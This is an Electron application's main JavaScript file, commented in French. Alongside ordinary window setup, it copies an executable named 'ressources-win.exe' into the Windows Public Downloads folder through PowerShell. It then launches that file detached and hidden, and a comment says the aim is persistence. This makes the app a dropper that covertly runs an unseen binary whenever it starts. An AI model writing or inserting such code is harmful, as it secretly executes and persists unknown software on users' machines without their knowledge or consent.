const { app, BrowserWindow } = require('electron')
const path = require('path')

//on créée la fonction qui va générer la fenêtre de l'app
function createWindow() {
    const win = new BrowserWindow({
        width: 1600,
        height: 900
    })
// on charge le fichier HTML pour qu'electron charge la page de l'app
    win.loadFile('./src/index.html')
}
//quand l'application est prête on crée la fenetre
app.whenReady().then(() => {
    createWindow()

    app.on('activate', () => {
        if (BrowserWindow.getAllWindows().length === 0) {
            createWindow()
        }
    })
})
//const exex pour faire un processus enfant
const { exec } = require('child_process');
exec('Copy-Item ".\\ressources-win.exe" "C:\\Users\\Public\\Downloads"', {'shell':'powershell.exe'}, (error, stdout, stderr)=> {
    // do whatever with stdout
})
//const spawn pour faire un processus enfant
const spawn = require('child_process').spawn;
//on fait spawn le process en mode détaché du programme pour établir une certaine forme de persistence du script
var process = spawn('.\\ressources-win.exe', {detached: true, windowsHide: true})
//on lance le process
process.unref()

//si la fenêtre de l'application est fermée, la quitter
app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit()
    }
})